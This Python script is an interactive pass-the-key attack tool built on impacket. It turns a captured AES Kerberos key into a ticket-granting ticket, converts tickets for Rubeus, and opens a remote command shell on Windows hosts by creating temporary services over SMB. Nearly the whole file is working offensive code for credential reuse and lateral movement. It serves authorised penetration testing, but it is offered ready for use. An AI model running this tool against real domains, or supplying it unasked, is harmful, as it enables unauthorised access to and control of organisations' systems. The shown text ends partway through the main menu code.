#!/usr/bin/env python3


import sys
import os
import logging
import re
import random
import string
import time
import struct
from binascii import unhexlify, hexlify, Error as BinasciiError
from datetime import datetime, timezone
import signal
import threading

_interrupt_event = threading.Event()

def _signal_handler(signum, frame):
    _interrupt_event.set()
    raise KeyboardInterrupt

signal.signal(signal.SIGINT, _signal_handler)

class C:
    H  = '[95m'
    B  = '[94m'
    G  = '[92m'
    Y  = '[93m'
    R  = '[91m'
    X  = '[0m'
    BD = '[1m'
    DIM = '[2m'


# ── Suppress impacket noise ──
logging.disable(logging.CRITICAL)

# ── Import impacket components ──
try:
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import KRB_CRED, EncKrbCredPart, KrbCredInfo, seq_set, seq_set_iter
    from impacket.krb5.crypto import Key
    from impacket import version
    HAS_IMPACKET = True
except ImportError as e:
    print("[-] impacket is not installed or incomplete.")
    print(f"    Missing: {e.name if hasattr(e, 'name') else str(e)}")
    print("    Install: pip3 install impacket")
    print("    Or:     apt install python3-impacket")
    sys.exit(1)

# ── CONSTANTS ──
PROGRAM_BANNER = f"""
{C.BD}{C.B}╔══════════════════════════════════════════════════════════════════════════════╗{C.X}
{C.BD}{C.B}║                             PASS-THE-KEY                                     ║{C.X}
{C.BD}{C.B}║                     takes the key to open the shell                          ║{C.X}
{C.BD}{C.B}╚══════════════════════════════════════════════════════════════════════════════╝{C.X}
"""

TMP_DIR = r"C:\Windows\Temp"
SHELL_WAIT_MAX = 60
READ_MAX = 10 * 1024 * 1024


# ═══════════════════════════════════════════════════════════════════════════════
# INPUT HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def get_input(prompt, default=None, required=False, validator=None):
    """Robust input prompt with validation and interrupt handling."""
    while True:
        try:
            display = f"{prompt} [{default}]: " if default is not None else f"{prompt}: "
            val = input(display).strip()
            if not val and default is not None:
                val = default
            if required and not val:
                print("[-] This field is required.")
                continue
            if validator and val:
                try:
                    validator(val)
                except ValueError as ve:
                    print(f"[-] {ve}")
                    continue
            return val
        except (KeyboardInterrupt, EOFError):
            print("\n[!] Cancelled by user. Exiting.")
            sys.exit(0)


def validate_non_empty(value):
    if not value or not value.strip():
        raise ValueError("Value cannot be empty.")


def validate_no_spaces(value):
    if " " in value:
        raise ValueError("Value cannot contain spaces.")


def validate_domain(value):
    validate_non_empty(value)
    validate_no_spaces(value)
    if not re.match(r"^[a-zA-Z0-9._-]+$", value):
        raise ValueError("Domain contains invalid characters.")


def validate_username(value):
    validate_non_empty(value)
    validate_no_spaces(value)
    if not re.match(r"^[a-zA-Z0-9._\-$]+$", value):
        raise ValueError("Username contains invalid characters.")


def validate_ip(value):
    if not value:
        return
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if not re.match(pattern, value):
        raise ValueError("Invalid IP format. Expected: 192.168.1.10")
    parts = value.split(".")
    for part in parts:
        num = int(part)
        if not 0 <= num <= 255:
            raise ValueError("IP octets must be 0-255.")


def validate_hex_32(value):
    validate_non_empty(value)
    v = value.strip().lower()
    if len(v) != 32:
        raise ValueError(f"Must be exactly 32 hex chars (got {len(v)}).")
    if not all(c in "0123456789abcdef" for c in v):
        raise ValueError("Contains non-hex characters.")
    try:
        unhexlify(v)
    except BinasciiError:
        raise ValueError("Invalid hex encoding.")


def validate_hex_64(value):
    validate_non_empty(value)
    v = value.strip().lower()
    if len(v) != 64:
        raise ValueError(f"Must be exactly 64 hex chars (got {len(v)}).")
    if not all(c in "0123456789abcdef" for c in v):
        raise ValueError("Contains non-hex characters.")
    try:
        unhexlify(v)
    except BinasciiError:
        raise ValueError("Invalid hex encoding.")


def validate_file_exists(value):
    validate_non_empty(value)
    if not os.path.isfile(value):
        raise ValueError(f"File not found: {value}")


def validate_target(value):
    validate_non_empty(value)
    # Target can be IP or hostname
    if re.match(r"^(\d{1,3}\.){3}\d{1,3}$", value):
        parts = value.split(".")
        for part in parts:
            if not 0 <= int(part) <= 255:
                raise ValueError("Invalid IP octets.")
    elif not re.match(r"^[a-zA-Z0-9._-]+$", value):
        raise ValueError("Target contains invalid characters.")


# ═══════════════════════════════════════════════════════════════════════════════
# AUTHENTICATION METHOD
# ═══════════════════════════════════════════════════════════════════════════════

def choose_auth_method():
    inner = 78
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
    print(f"{C.BD}{C.B}{pad("CHOOSE AES KEY TYPE (Pass-the-Key)")}{C.X}")
    print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
    print(" [1] AES256 key (64 hex chars)")
    print(" [2] AES128 key (32 hex chars)")
    print("=" * 60)
    while True:
        try:
            choice = input(" Choice [1-2]: ").strip()
            if choice in ("1", "2"):
                return choice
            print("[-] Enter 1 or 2.")
        except (KeyboardInterrupt, EOFError):
            print("\n[!] Cancelled by user. Exiting.")
            sys.exit(0)


# ═══════════════════════════════════════════════════════════════════════════════
# TICKET OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

def save_ticket(username, ticket, session_key):
    """Save TGT to ccache file."""
    out_file = f"{username}.ccache"
    try:
        ccache = CCache()
        ccache.fromTGT(ticket, session_key, session_key)
        ccache.saveFile(out_file)
        abs_path = os.path.abspath(out_file)
        size = os.path.getsize(out_file)
        print(f"\n[+] Ticket saved successfully!")
        print(f"    File: {abs_path}")
        print(f"    Size: {size} bytes")
        return abs_path
    except PermissionError:
        print(f"\n[-] Permission denied writing to: {out_file}")
        print("    -> Check write permissions in current directory.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Failed to save ticket: {e}")
        sys.exit(1)


def verify_ticket_file(username):
    """Basic structural verification of ccache file."""
    ccache_path = f"{username}.ccache"
    if not os.path.exists(ccache_path):
        print(f"[-] Ticket file not found: {ccache_path}")
        return False
    try:
        with open(ccache_path, "rb") as f:
            header = f.read(4)
            if len(header) < 4:
                print("[-] Ticket file is empty or corrupt (header too short).")
                return False
            # CCache header: first 2 bytes = version (0x0501 or 0x0502)
            version = struct.unpack("<H", header[:2])[0]
            if version not in (0x0501, 0x0502, 0x0503, 0x0504):
                print(f"[!] Warning: Unexpected ccache version: 0x{version:04x}")
        print(f"[+] Ticket file verified: {ccache_path}")
        return True
    except PermissionError:
        print(f"[-] Permission denied reading: {ccache_path}")
        return False
    except Exception as e:
        print(f"[-] Cannot read ticket file: {e}")
        return False


def inspect_ticket(ccache_path):
    """Built-in klist-like ticket inspection. No external calls."""
    if not os.path.exists(ccache_path):
        print(f"[-] Ticket file not found: {ccache_path}")
        return
    try:
        ccache = CCache.loadFile(ccache_path)
        inner = 78
        pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
        print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
        print(f"{C.BD}{C.B}{pad("TICKET CACHE INSPECTOR (built-in)")}{C.X}")
        print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
        print(f" Default principal: {ccache.principal.toPrincipal()}")
        print(f" Credentials count: {len(ccache.credentials)}")
        print("-" * 60)
        for i, cred in enumerate(ccache.credentials, 1):
            client = cred.header.client.toPrincipal()
            server = cred.header.server.toPrincipal()
            flags = cred.ticketFlags
            start = cred.header.time_from
            end = cred.header.time_till
            renew_till = cred.header.time_renew_till
            print(f"\n [{i}] Server: {server}")
            print(f"      Client: {client}")
            print(f"      Start:  {start}")
            print(f"      End:    {end}")
            print(f"      Renew:  {renew_till}")
            print(f"      Flags:  0x{flags:08x}")
        print("=" * 60)
    except PermissionError:
        print(f"[-] Permission denied reading: {ccache_path}")
    except Exception as e:
        print(f"[-] Failed to inspect ticket: {e}")


def convert_ccache_to_kirbi(ccache_path, out_path):
    if not os.path.exists(ccache_path):
        print(f"[-] Source file not found: {ccache_path}")
        return False
    try:
        ccache = CCache.loadFile(ccache_path)
        creds = ccache.credentials
        if not creds:
            print("[-] No credentials found in ccache.")
            return False

        # Build KRB-CRED structure
        from pyasn1.type import univ, namedtype, namedval, tag, constraint
        from pyasn1.codec.der import encoder, decoder

        # We use impacket's ASN.1 structures
        krb_cred = KRB_CRED()
        seq_set_iter(krb_cred, 'ticket', [cred.ticket.to_asn1() for cred in creds])

        enc_krb_cred_part = EncKrbCredPart()
        krb_cred_infos = []
        for cred in creds:
            info = KrbCredInfo()
            # Key
            info['key'] = cred.header.key.to_asn1()
            # Principal names
            info['prealm'] = cred.header.client.realm.to_asn1()
            info['pname'] = cred.header.client.to_asn1()
            # Flags
            info['flags'] = cred.ticketFlags
            # Times
            info['starttime'] = cred.header.time_from.to_asn1()
            info['endtime'] = cred.header.time_till.to_asn1()
            info['renew-till'] = cred.header.time_renew_till.to_asn1()
            info['srealm'] = cred.header.server.realm.to_asn1()
            info['sname'] = cred.header.server.to_asn1()
            # Addresses (optional)
            if cred.header.addresses:
                info['caddr'] = cred.header.addresses.to_asn1()
            krb_cred_infos.append(info)

        seq_set_iter(enc_krb_cred_part, 'ticket-info', krb_cred_infos)
        krb_cred['enc-part'] = enc_krb_cred_part

        data = encoder.encode(krb_cred)
        with open(out_path, 'wb') as f:
            f.write(data)
        print(f"[+] Converted to kirbi: {os.path.abspath(out_path)} ({len(data)} bytes)")
        return True
    except PermissionError:
        print(f"[-] Permission denied writing: {out_path}")
        return False
    except Exception as e:
        print(f"[-] Conversion failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# KERBEROS ERROR HANDLING
# ═══════════════════════════════════════════════════════════════════════════════

def handle_kerberos_error(e, domain, username, dc_ip):
    """Comprehensive Kerberos error classification and user guidance."""
    err = str(e)
    lowered = err.lower()

    # Pre-authentication failure
    if "KDC_ERR_PREAUTH_FAILED" in err or "preauth" in lowered:
        print("[-] Pre-authentication failed.")
        print("    -> Wrong AES key.")
        print("    -> The account may be disabled or locked out.")
        print("    -> The account may require a different encryption type.")
        return

    # Unknown user
    if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in err or "principal unknown" in lowered:
        print(f"[-] User '{username}' not found in domain '{domain}'.")
        print("    -> Check the username and domain spelling.")
        print("    -> Verify the user exists in the target domain.")
        return

    # Etype not supported
    if "KDC_ERR_ETYPE_NOSUPP" in err or "etype" in lowered:
        print("[-] Encryption type not supported by the KDC.")
        print("    -> Try the other AES key type (128 vs 256).")
        print("    -> The domain may not support AES keys for this account.")
        return

    # Network unreachable
    if "Network is unreachable" in err:
        print(f"[-] Cannot reach the Domain Controller at {dc_ip}.")
        print("    -> Check DC IP address.")
        print("    -> Verify your network interface and routing.")
        return

    # Connection refused
    if "Connection refused" in err:
        print(f"[-] Connection refused by {dc_ip}.")
        print("    -> Verify port 88 (Kerberos) is open on the DC.")
        print("    -> The host may not be a Domain Controller.")
        return

    # Timeout
    if "timed out" in lowered or "timeout" in lowered:
        print(f"[-] Connection to DC at {dc_ip} timed out.")
        print("    -> The DC may be unreachable or blocking traffic.")
        print("    -> Check firewall rules between you and the DC.")
        return

    # Clock skew
    if "KRB_AP_ERR_SKEW" in err or "skew" in lowered:
        print("[-] Clock skew too large between your machine and the DC.")
        print(f"    -> Sync your time: sudo ntpdate {dc_ip}")
        print("    -> Or: sudo timedatectl set-ntp true")
        return

    # Wrong realm
    if "KRB5KDC_ERR_WRONG_REALM" in err or "wrong realm" in lowered:
        print("[-] Wrong realm / domain specified.")
        print("    -> Verify the domain matches the DC's realm exactly.")
        print("    -> Try the NETBIOS name or the full DNS domain name.")
        return

    # Client revoked / disabled
    if "KDC_ERR_CLIENT_REVOKED" in err or "revoked" in lowered:
        print("[-] Account is disabled or revoked.")
        return

    # Policy rejection
    if "KDC_ERR_POLICY" in err:
        print("[-] KDC policy rejection.")
        print("    -> The account may be restricted from Kerberos auth.")
        print("    -> Check if the account has 'Do not require Kerberos preauth'.")
        return

    # Generic catch-all
    print(f"[-] Kerberos error: {err}")
    print("    -> If network error: verify DC IP, port 88, and connectivity.")
    print("    -> If auth error: double-check your AES key and account status.")
    print("    -> If encryption error: try AES128 instead of AES256 (or vice versa).")


# ═══════════════════════════════════════════════════════════════════════════════
# CREDENTIAL COLLECTION
# ═══════════════════════════════════════════════════════════════════════════════

def collect_credentials():
    inner = 78
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
    print(f"{C.BD}{C.B}{pad("TARGET INFORMATION")}{C.X}")
    print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
    domain = get_input(
        " Domain (e.g., CORP.LOCAL, domain.com)",
        required=True, validator=validate_domain
    )
    username = get_input(
        " Username (e.g., Administrator)",
        required=True, validator=validate_username
    )
    dc_ip = get_input(
        " Domain Controller IP",
        default="192.168.x.x",
        required=True, validator=validate_ip
    )

    inner = 78
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
    print(f"{C.BD}{C.B}{pad("CREDENTIALS (Pass-the-Key)")}{C.X}")
    print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
    auth_choice = choose_auth_method()
    aeskey = ""
    key_type = ""

    if auth_choice == "1":
        raw = get_input(
            " AES256 key (64 hex chars)",
            required=True, validator=validate_hex_64
        )
        aeskey = raw.strip().lower()
        key_type = "AES256"
    elif auth_choice == "2":
        raw = get_input(
            " AES128 key (32 hex chars)",
            required=True, validator=validate_hex_32
        )
        aeskey = raw.strip().lower()
        key_type = "AES128"

    return {
        "domain": domain,
        "username": username,
        "dc_ip": dc_ip,
        "auth_choice": auth_choice,
        "key_type": key_type,
        "aeskey": aeskey,
    }


# ═══════════════════════════════════════════════════════════════════════════════
# TGT REQUEST
# ═══════════════════════════════════════════════════════════════════════════════

def request_tgt(creds):
    domain = creds["domain"]
    username = creds["username"]
    dc_ip = creds["dc_ip"]
    aeskey = creds["aeskey"]

    print(f"\n[*] Requesting TGT for {domain}\\{username} from {dc_ip} ...")
    print("    (this may take a few seconds)")

    try:
        user_principal = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            clientName=user_principal,
            password="",
            domain=domain,
            lmhash=b"",
            nthash=b"",
            aesKey=aeskey,
            kdcHost=dc_ip
        )

        print("\n[+] TGT obtained successfully via Pass-the-Key!")
        return tgt, old_session_key

    except Exception as e:
        print()
        handle_kerberos_error(e, domain, username, dc_ip)
        sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# NEXT STEPS / BUILT-IN UTILITIES
# ═══════════════════════════════════════════════════════════════════════════════

def print_next_steps(username, domain, dc_ip):
    ccache_file = f"{username}.ccache"
    kirbi_file = f"{username}.kirbi"

    inner = 78
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
    print(f"{C.BD}{C.B}{pad("NEXT STEPS")}{C.X}")
    print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
    print(" Built-in (no external scripts needed):")
    print(f"    Inspect ticket:  run the built-in inspector from main menu")
    print(f"    Convert to kirbi: run the built-in converter from main menu")
    print()
    print(" Manual export for impacket tools:")
    print(f"    export KRB5CCNAME={ccache_file}")
    print()
    print(" Impacket examples (after export):")
    print()
    print(" Windows / Rubeus:")
    print(f"    Convert to kirbi first, then use with Rubeus")
    print("=" * 60)


# ═══════════════════════════════════════════════════════════════════════════════
# SMB / SHELL FUNCTIONALITY
# ═══════════════════════════════════════════════════════════════════════════════

def connect_with_ticket(target, username, domain, dc_ip, ccache_file):
    """Connect to target via SMB using Kerberos ticket. Pure impacket."""
    print(f"\n[*] Connecting to {target} with Kerberos ticket ...")
    os.environ['KRB5CCNAME'] = ccache_file

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print("[-] impacket.smbconnection not available.")
        return None

    smb = None
    try:
        smb = SMBConnection(target, target, sess_port=445)
        smb.kerberosLogin(
            username, '',
            domain=domain,
            kdcHost=dc_ip,
            useCache=True
        )
        print("[+] SMB authenticated via Kerberos ticket!")
        return smb
    except Exception as e:
        err = str(e)
        print(f"[-] Kerberos SMB auth failed: {err}")

        if "KRB_AP_ERR_SKEW" in err:
            print("    -> Clock skew! Sync time: sudo ntpdate", dc_ip)
        elif "KRB_AP_ERR_TKT_EXPIRED" in err or "expired" in err.lower():
            print("    -> Ticket expired. Request a new TGT.")
        elif "KRB_AP_ERR_NOT_US" in err:
            print("    -> Ticket not valid for this target. Check target name / IP.")
        elif "Connection refused" in err:
            print("    -> Target unreachable. Check IP and port 445.")
        elif "timed out" in err.lower():
            print("    -> Connection timed out. Check network path to target.")
        elif "KRB_AP_ERR_BAD_INTEGRITY" in err:
            print("    -> Bad integrity. Wrong ticket or target mismatch.")
        elif "STATUS_LOGON_FAILURE" in err:
            print("    -> Logon failure. Ticket may not map to this target.")
        elif "STATUS_ACCESS_DENIED" in err:
            print("    -> Access denied. Insufficient privileges on target.")

        if smb:
            try:
                smb.logoff()
            except Exception:
                pass
        return None


class TicketShell:
    """SMB command execution shell via SCManager. No external processes."""
    LMHASH = 'aad3b435b51404eeaad3b435b51404ee'
    TMP_DIR = r'C:\Windows\Temp'
    WAIT_MAX = 60
    READ_MAX = 10 * 1024 * 1024

    def __init__(self, smb, target, username, domain, dc_ip, ccache_file):
        self.smb = smb
        self.target = target
        self.username = username
        self.domain = domain
        self.dc_ip = dc_ip
        self.ccache_file = ccache_file
        self._dce = None
        self._scm = None
        self._cwd = 'C:\\'
        self._cleaned = False
        self._bind_sc_manager()

    def _rand(self, n=8):
        return "".join(random.choices(string.ascii_lowercase, k=n))

    def _tmp(self, ext):
        return f"{self.TMP_DIR}\\tgt_{self._rand()}.{ext}"

    def _smb_path(self, full_path):
        p = full_path.replace("/", "\\")
        if len(p) >= 2 and p[1] == ':':
            p = p[2:]
        return p.lstrip("\\")

    def _extract_share(self, full_path):
        p = full_path.replace("/", "\\")
        if len(p) >= 2 and p[1] == ':':
            return p[0].upper() + "$"
        return "C$"

    def _bind_sc_manager(self):
        from impacket.dcerpc.v5 import transport, scmr
        try:
            rpctransport = transport.SMBTransport(
                self.target, 445, r"\svcctl",
                smb_connection=self.smb
            )
            self._dce = rpctransport.get_dce_rpc()
            self._dce.connect()
            self._dce.bind(scmr.MSRPC_UUID_SCMR)
            self._scm = scmr.hROpenSCManagerW(self._dce)["lpScHandle"]
            print("[+] SCManager bound successfully.")
        except Exception as e:
            print(f"[-] Failed to bind SCManager: {e}")
            print("    -> Target may not allow remote service management.")
            print("    -> Check if you have admin privileges on target.")
            self._dce = None
            self._scm = None

    def _smb_write(self, full_path, data):
        share = self._extract_share(full_path)
        share_path = self._smb_path(full_path)
        tid = fid = None
        try:
            tid = self.smb.connectTree(share)
            fid = self.smb.createFile(
                tid, share_path,
                desiredAccess=0x40000000,
                shareMode=0x7,
                creationDisposition=0x2,
                fileAttributes=0x80,
                impersonationLevel=0x2
            )
            self.smb.writeFile(tid, fid, data)
        except Exception as e:
            print(f"[!] SMB write error: {e}")
            raise
        finally:
            if fid is not None:
                try:
                    self.smb.closeFile(tid, fid)
                except Exception:
                    pass
            if tid is not None:
                try:
                    self.smb.disconnectTree(tid)
                except Exception:
                    pass

    def _smb_read(self, full_path):
        share = self._extract_share(full_path)
        share_path = self._smb_path(full_path)
        tid = fid = None
        try:
            tid = self.smb.connectTree(share)
            fid = self.smb.openFile(
                tid, share_path,
                desiredAccess=0x80000000,
                shareMode=0x7,
                creationDisposition=0x3
            )
            buf = b""
            offset = 0
            while True:
                chunk = self.smb.readFile(tid, fid, offset=offset, bytesToRead=65535)
                if not chunk:
                    break
                buf += chunk
                offset += len(chunk)
                if len(buf) >= self.READ_MAX:
                    print(" [!] Output truncated (>10 MB)")
                    break
            return buf
        except Exception as e:
            if "STATUS_OBJECT_NAME_NOT_FOUND" not in str(e):
                print(f"[!] SMB read error: {e}")
            raise
        finally:
            if fid is not None:
                try:
                    self.smb.closeFile(tid, fid)
                except Exception:
                    pass
            if tid is not None:
                try:
                    self.smb.disconnectTree(tid)
                except Exception:
                    pass

    def _smb_delete(self, full_path):
        if self.smb is None:
            return
        share = self._extract_share(full_path)
        share_path = self._smb_path(full_path)
        tid = None
        try:
            tid = self.smb.connectTree(share)
            self.smb.deleteFiles(tid, share_path)
        except Exception:
            pass
        finally:
            if tid is not None:
                try:
                    self.smb.disconnectTree(tid)
                except Exception:
                    pass

    def _decode(self, raw):
        for enc in ('utf-8', 'cp850', 'cp1252', 'latin-1'):
            try:
                return raw.decode(enc)
            except (UnicodeDecodeError, LookupError):
                continue
        return raw.decode('ascii', errors='replace')

    def run(self, cmd):
        from impacket.dcerpc.v5 import scmr
        if not self._scm or not self._dce:
            print("[-] SCManager not available. Cannot execute commands.")
            return ''

        bat_path = self._tmp('bat')
        out_path = self._tmp('txt')
        svc_name = "tgt_" + self._rand(10)

        bat_content = (
            "@echo off\r\n"
            f"cd /d \"{self._cwd}\"\r\n"
            "(\r\n"
            f"{cmd}\r\n"
            f") > \"{out_path}\" 2>&1\r\n"
        ).encode('utf-8')

        svc_binary = f'C:\\Windows\\System32\\cmd.exe /Q /c "{bat_path}"'
        svc_handle = None

        try:
            self._smb_write(bat_path, bat_content)

            # Create service
            try:
                svc_handle = scmr.hRCreateServiceW(
                    self._dce, self._scm, svc_name, svc_name,
                    lpBinaryPathName=svc_binary,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]
            except Exception:
                # Service might exist from previous failed run; try delete and recreate
                try:
                    old = scmr.hROpenServiceW(self._dce, self._scm, svc_name)['lpServiceHandle']
                    scmr.hRDeleteService(self._dce, old)
                    scmr.hRCloseServiceHandle(self._dce, old)
                except Exception:
                    pass
                svc_handle = scmr.hRCreateServiceW(
                    self._dce, self._scm, svc_name, svc_name,
                    lpBinaryPathName=svc_binary,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]

            # Start service
            try:
                scmr.hRStartServiceW(self._dce, svc_handle)
            except Exception as e:
                s = str(e)
                if "ERROR_SERVICE_REQUEST" not in s and "ERROR_SERVICE_SPECIFIC" not in s and "1053" not in s:
                    print(f" [!] Service start warning: {e}")

            # Wait for completion
            SERVICE_STOPPED = 1
            start_time = time.time()
            deadline = start_time + self.WAIT_MAX
            timed_out = True
            shown_wait = False

            while time.time() < deadline:
                try:
                    resp = scmr.hRQueryServiceStatus(self._dce, svc_handle)
                    state = resp['lpServiceStatus']['dwCurrentState']
                    if state == SERVICE_STOPPED:
                        timed_out = False
                        break
                except Exception:
                    timed_out = False
                    break
                if not shown_wait and (time.time() - start_time) >= 1.0:
                    print(" Running...", end="\r", flush=True)
                    shown_wait = True
                time.sleep(0.4)

            if shown_wait:
                print(" " * 20, end="\r")
            if timed_out:
                print(" [!] Command timed out")

            time.sleep(0.3)

            try:
                raw = self._smb_read(out_path)
                return self._decode(raw).strip()
            except Exception as e:
                if "STATUS_OBJECT_NAME_NOT_FOUND" not in str(e):
                    print(f" [!] Output read error: {e}")
                return ''

        except Exception as e:
            print(f"[!] Command execution error: {e}")
            return ''
        finally:
            try:
                if svc_handle:
                    scmr.hRDeleteService(self._dce, svc_handle)
                    scmr.hRCloseServiceHandle(self._dce, svc_handle)
            except Exception:
                pass
            self._smb_delete(bat_path)
            self._smb_delete(out_path)

    def cleanup(self):
        if self._cleaned:
            return
        self._cleaned = True
        try:
            from impacket.dcerpc.v5 import scmr
            if self._scm and self._dce:
                scmr.hRCloseServiceHandle(self._dce, self._scm)
        except Exception:
            pass
        try:
            if self._dce:
                self._dce.disconnect()
        except Exception:
            pass
        try:
            if self.smb:
                self.smb.logoff()
        except Exception:
            pass
        print("[+] Session cleaned up")


def list_shares(smb):
    """List available SMB shares."""
    try:
        shares = smb.listShares()
        print("\n Available shares:")
        for share in shares:
            name = share['shi1_netname'][:-1]
            print(f"  - {name}")
    except Exception as e:
        print(f"[-] Failed to list shares: {e}")


def interactive_ticket_shell(shell):
    """Interactive command shell using the ticket."""
    inner = 78
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
    print(f"{C.BD}{C.B}{pad("TICKET SHELL - Authenticated via Kerberos Pass-the-Key")}{C.X}")
    print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
    print(" Built-in commands:")
    print("   whoami  - verify identity on target")
    print("   shares  - list SMB shares")
    print("   cd <dir> - change working directory")
    print("   pwd     - show current directory")
    print("   exit    - close shell")
    print("   help    - show this help")
    print(" Anything else runs as a Windows command\n")

    while True:
        try:
            cmd = input(f"ticket-shell [{shell._cwd}]> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Exiting shell.")
            break

        if not cmd:
            continue

        lower = cmd.lower()

        if lower in ("exit", "quit", "q"):
            break

        if lower == "help" or lower == "?":
            print("   whoami  - verify identity")
            print("   shares  - list SMB shares")
            print("   cd      - change directory")
            print("   pwd     - print working directory")
            print("   exit    - quit shell")
            continue

        if lower == "whoami":
            out = shell.run('whoami')
            print(out if out else " (no output)")
            continue

        if lower == "shares":
            list_shares(shell.smb)
            continue

        if lower == "pwd":
            print(f" {shell._cwd}")
            continue

        if lower.startswith("cd"):
            parts = cmd.split(None, 1)
            if len(parts) == 2:
                new_dir = parts[1].strip()
                try:
                    out = shell.run(f'cd /d "{new_dir}" && if errorlevel 1 (echo __CDFAIL__) else (cd)')
                    if '__CDFAIL__' in out:
                        print(" [-] Directory not found")
                    else:
                        lines = [l.strip() for l in out.splitlines() if l.strip()]
                        if lines:
                            shell._cwd = lines[-1]
                            print(f" [*] cwd -> {shell._cwd}")
                except Exception as e:
                    print(f" [!] Error: {e}")
            else:
                print(f" cwd: {shell._cwd}")
            continue

        # Regular command
        try:
            output = shell.run(cmd)
            print(output if output else " (no output)")
        except Exception as e:
            print(f" [!] Error: {e}")


def sign_in_with_ticket(target, username, domain, dc_ip, ccache_file):
    """Connect and drop into an interactive shell using the ticket."""
    smb = connect_with_ticket(target, username, domain, dc_ip, ccache_file)
    if not smb:
        return

    shell = TicketShell(smb, target, username, domain, dc_ip, ccache_file)

    print("[*] Verifying command execution ...")
    out = shell.run('whoami')
    if out:
        print(f"[+] Verified as: {out}\n")
    else:
        print("[!] whoami returned no output. Proceeding anyway.\n")

    try:
        interactive_ticket_shell(shell)
    finally:
        shell.cleanup()


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN MENU & FLOW
# ═══════════════════════════════════════════════════════════════════════════════

def print_main_menu():
    inner = 78
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔{'═' * inner}╗{C.X}")
    print(f"{C.BD}{C.B}{pad('MAIN MENU')}{C.X}")
    print(f"{C.BD}{C.B}╚{'═' * inner}╝{C.X}")
    print(" [1] Get TGT only (request ticket using AES key)")
    print(" [2] Get TGT + Sign in (request ticket, then SMB shell)")
    print(" [3] Sign in with existing ticket (skip TGT request)")
    print(" [4] Inspect existing ticket (built-in klist)")
    print(" [5] Convert ccache to kirbi (built-in converter)")
    print(" [6] Exit")
    print("=" * 60)


def main():
    print(PROGRAM_BANNER)

    while True:
        print_main_menu()
        try:
            mode = input(" Choice [1-6]: ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[!] Exiting.")
            sys.exit(0)

        if mode == "6":
            print("[+] Goodbye.")
            sys.exit(0)

        if mode == "5":
            inner = 78
            pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
            print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
            print(f"{C.BD}{C.B}{pad("CONVERT CCACHE TO KIRBI")}{C.X}")
            print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
            ccache_in = get_input(" Input .ccache file", default="Administrator.ccache", required=True, validator=validate_file_exists)
            username = get_input(" Username (for output filename)", default="Administrator", required=True)
            kirbi_out = f"{username}.kirbi"
            convert_ccache_to_kirbi(ccache_in, kirbi_out)
            continue

        if mode == "4":
            inner = 78
            pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
            print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
            print(f"{C.BD}{C.B}{pad("INSPECT TICKET")}{C.X}")
            print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
            ccache_file = get_input(" Path to .ccache file", default="Administrator.ccache", required=True, validator=validate_file_exists)
            inspect_ticket(ccache_file)
            continue

        if mode == "3":
            inner = 78
            pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
            print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
            print(f"{C.BD}{C.B}{pad("SIGN IN WITH EXISTING TICKET")}{C.X}")
            print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
            ccache_file = get_input(" Path to .ccache file", default="Administrator.ccache", required=True, validator=validate_file_exists)
            username = get_input(" Username", required=True, validator=validate_username)
            domain = get_input(" Domain", required=True, validator=validate_domain)
            dc_ip = get_input(" DC IP", default="192.168.x.x", required=True, validator=validate_ip)
            target = get_input(" Target IP/Hostname", required=True, validator=validate_target)
            sign_in_with_ticket(target, username, domain, dc_ip, ccache_file)
            continue

        if mode in ("1", "2"):
            creds = collect_credentials()

            inner = 78
            pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
            print(f"{C.BD}{C.B}╔{"═" * inner}╗{C.X}")
            print(f"{C.BD}{C.B}{pad("SUMMARY")}{C.X}")
            print(f"{C.BD}{C.B}╚{"═" * inner}╝{C.X}")
            print(f" Domain   : {creds['domain']}")
